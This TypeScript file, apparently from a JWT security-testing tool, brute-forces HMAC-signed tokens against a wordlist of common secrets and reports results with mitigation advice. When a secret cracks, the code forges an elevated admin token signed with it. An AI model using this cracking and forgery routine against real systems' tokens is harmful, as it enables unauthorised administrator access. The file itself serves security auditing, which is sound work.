import { createHmac } from "crypto";
import { BruteForceResult, DecodedJwt } from "../types/jwt";
import { base64urlEncode } from "./decoder";
import { getWordlist } from "../wordlists/common-secrets";

function mapAlgToHmac(alg: string): "sha256" | "sha384" | "sha512" | null {
  const upper = alg.toUpperCase();
  if (upper === "HS256") return "sha256";
  if (upper === "HS384") return "sha384";
  if (upper === "HS512") return "sha512";
  return null;
}

export async function runBruteForce(
  decoded: DecodedJwt,
  wordlistSize: "small" | "medium" | "large",
): Promise<BruteForceResult> {
  const hmacAlg = mapAlgToHmac(decoded.header.alg);
  if (!hmacAlg) {
    return {
      status: "SECURE",
      crackedSecret: null,
      attemptCount: 0,
      timeMs: 0,
      forgedToken: null,
      explanation: "Asymmetric or unsupported algorithm — HMAC brute force is not applicable.",
      mitigation: "Use strong asymmetric signing keys and strict algorithm validation.",
      steps: [
        `1. Algorithm detected: ${decoded.header.alg}`,
        "2. Brute-force skipped because algorithm is not HMAC-based",
      ],
    };
  }

  const start = performance.now();
  const wordlist = getWordlist(wordlistSize);
  const input = `${decoded.raw.header}.${decoded.raw.payload}`;

  let crackedSecret: string | null = null;
  let attempts = 0;

  for (const candidate of wordlist) {
    attempts += 1;
    const computed = createHmac(hmacAlg, candidate).update(input).digest("base64url");
    if (computed === decoded.signature) {
      crackedSecret = candidate;
      break;
    }
  }

  const elapsed = Math.round((performance.now() - start) * 100) / 100;

  if (!crackedSecret) {
    return {
      status: "SECURE",
      crackedSecret: null,
      attemptCount: attempts,
      timeMs: elapsed,
      forgedToken: null,
      explanation: "No matching secret found in the selected dictionary.",
      mitigation: "Use long, random secrets (32+ bytes) and rotate them regularly.",
      steps: [
        `1. Algorithm detected: ${decoded.header.alg} (HMAC — brute-force applicable)`,
        `2. Loaded wordlist: ${wordlist.length} common secrets`,
        "3. Recomputed HMAC for each candidate and compared signatures",
        `4. No match found after ${attempts} attempts`,
      ],
    };
  }

  const forgedPayload = {
    ...decoded.payload,
    role: "admin",
    admin: true,
    exp: Math.floor(Date.now() / 1000) + 86400,
  };
  const newHeader = base64urlEncode(JSON.stringify(decoded.header));
  const newPayload = base64urlEncode(JSON.stringify(forgedPayload));
  const newSig = createHmac(hmacAlg, crackedSecret).update(`${newHeader}.${newPayload}`).digest("base64url");

  return {
    status: "VULNERABLE",
    crackedSecret,
    attemptCount: attempts,
    timeMs: elapsed,
    forgedToken: `${newHeader}.${newPayload}.${newSig}`,
    explanation: "The JWT secret was cracked with a dictionary attack, allowing arbitrary forged tokens.",
    mitigation: "Use random high-entropy secrets, protect them in a vault, and enforce key rotation.",
    steps: [
      `1. Algorithm detected: ${decoded.header.alg} (HMAC — brute-force applicable)`,
      `2. Loaded wordlist: ${wordlist.length} common secrets`,
      `3. Signing input prepared: ${input.slice(0, 36)}...`,
      `4. Match found after ${attempts} attempts`,
      `5. Secret cracked: '${crackedSecret}'`,
      "6. Forged an elevated admin token signed with the cracked secret",
    ],
  };
}
